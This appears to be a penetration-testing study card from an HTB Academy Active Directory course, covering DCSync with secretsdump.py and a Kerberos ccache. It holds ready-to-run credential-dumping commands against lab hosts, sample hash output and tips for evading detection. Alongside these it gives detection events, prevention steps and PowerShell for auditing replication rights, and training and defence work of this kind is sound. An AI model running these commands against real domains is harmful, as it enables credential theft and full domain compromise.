name: secretsdump.py - DCSync via Kerberos TGT
description: Runs DCSync using a Kerberos TGT in the KRB5CCNAME environment variable instead of a password or hash. Used after PetitPotam/NoPac chains where you have a ccache for the DC machine account but not a plaintext password. -k pulls credentials from KRB5CCNAME, -no-pass skips password prompts.
source: CPTS Module 13: Active Directory Enumeration & Attacks
notes:
=== WHEN TO USE THIS vs AD-SECRETSDUMP-DCSYNC ===
ad-secretsdump-dcsync: uses username + password or NT hash for auth
This card: uses a Kerberos TGT (ccache file) — no password required

Use this card when:
  - You obtained a ccache via NoPac (-dump outputs one)
  - You have a ccache from PetitPotam + gettgtpkinit
  - You have a TGT from any Kerberos attack and want to DCSync

=== SETUP ===
export KRB5CCNAME=/path/to/administrator.ccache  (or dc01.ccache for machine account)
secretsdump.py -just-dc-user administrator -k -no-pass "ACADEMY-EA-DC01@172.16.5.5"

For DC machine account TGT (PetitPotam chain):
export KRB5CCNAME=dc01.ccache
secretsdump.py -just-dc-user administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL@172.16.5.5

=== TARGET FORMAT ===
The target format for Kerberos auth: hostname@ip or FQDN
Kerberos requires valid hostname resolution — use /etc/hosts if needed:
echo '172.16.5.5 ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' >> /etc/hosts

=== OUTPUT ===
Same as regular DCSync:
  administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
LM hash is always aad3... (disabled), NT hash is the second 32-char field.

examples.label: DCSync using PetitPotam DC machine account TGT

references.title: HTB Academy - Active Directory Enumeration & Attacks

defense.why_it_works: Identical to standard secretsdump DCSync — issues DRSGetNCChanges (MS-DRSR) RPC calls to the DC requesting object replication. The only difference is authentication method: instead of password or NT hash, the Kerberos ccache from KRB5CCNAME (obtained via PKINIT/NoPac/PetitPotam chain) is used to authenticate to the DRSUAPI interface. The DC machine account obtained via these chains holds Replicating Directory Changes rights by default, making it directly usable for DCSync.
defense.prerequisites: Valid .ccache file for an account with DCSync rights (typically the DC machine account from PKINIT/NoPac chains), set in KRB5CCNAME. Network access to DC on TCP 135 and high RPC ports. Impacket installed. FQDN resolvable for Kerberos (/etc/hosts if needed).
defense.impact: Same as all DCSync operations: full domain credential extraction — NT hashes, AES Kerberos keys, cleartext passwords where configured. Completes the PetitPotam/NoPac → PKINIT → NT hash → DCSync kill chain, achieving full domain compromise from a starting position of an ordinary domain user account.
defense.detection: Event 4662 on the DC domain object with replication GUIDs from a non-DC source IP — the canonical DCSync indicator, regardless of authentication method. Kerberos Event 4768 showing the DC machine account TGT being reused from a non-DC IP. Microsoft Defender for Identity DCSync alert fires on all DCSync patterns. The combination of a Kerberos auth from an unexpected IP followed immediately by DRSUAPI traffic is a strong compound indicator.
defense.artifacts: Event 4662 with replication GUIDs on DC, output files on attacker's disk (.ntds, .ntds.kerberos, .ntds.cleartext), Kerberos session from ccache (Event 4769 for TGS to DRSUAPI service), network MSRPC/DRSUAPI traffic from attacker's Linux IP.
defense.prevention: Revoke the certificate that enabled the ccache to be obtained (ADCS remediation). Reset the DC machine account password if the ccache was derived from the machine account via PKINIT — this invalidates the ccache and any derived NT hashes. Apply NoPac/PetitPotam patches upstream. Deploy MDI for DCSync real-time detection. Restrict replication rights (same preventions as all DCSync variants).
defense.evasion: Use -just-dc-user for targeted single-account pull. Kerberos auth (-k) avoids NTLM authentication logs and looks like normal DC-to-DC traffic at the authentication layer. Operate quickly — Event 4662 fires on every DRSGetNCChanges call.
defense.misconfiguration: User or computer accounts have been granted AD replication rights (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All) that are not needed for their role. These rights are required by Domain Controllers to synchronize, but if granted to a regular account (via ACL on the domain object, or inherited through group membership), the account can call DRSGetNCChanges() and pull NTLM hashes for any account — including krbtgt and Domain Admins.
defense.vulnerable_config:
# Checking who has dangerous replication rights on the domain object:
# (via BloodHound 'DCSync' edge, or directly):
Get-ObjectAcl -DistinguishedName 'DC=corp,DC=local' -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match 'DS-Replication-Get-Changes'} |
  Select-Object IdentityReference, ActiveDirectoryRights

# Dangerous output:
# IdentityReference            ActiveDirectoryRights
# CORP\svc_monitoring          DS-Replication-Get-Changes-All
# CORP\john.doe                DS-Replication-Get-Changes

# Legitimate holders: CORP\Domain Controllers, CORP\Enterprise Controllers, CORP\ENTERPRISE DOMAIN CONTROLLERS
defense.secure_config:
# Remove DCSync rights from non-DC accounts:
# Using PowerView:
$acl = Get-Acl 'AD:\DC=corp,DC=local'
$ace = $acl.Access | Where-Object {
    $_.IdentityReference -match 'svc_monitoring' -and
    $_.ObjectType -eq 'DS-Replication-Get-Changes-All'
}
$acl.RemoveAccessRule($ace)
Set-Acl 'AD:\DC=corp,DC=local' $acl

# Alert on all DCSync-capable accounts:
# Microsoft Defender for Identity detects DCSync automatically (alert: 'DCSync attack')
# SIEM: Watch for 4662 events with replication rights GUIDs:
# {19195a5b-6da0-11d0-afd3-00c04fd930c9} = DS-Replication-Get-Changes
# {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} = DS-Replication-Get-Changes-All
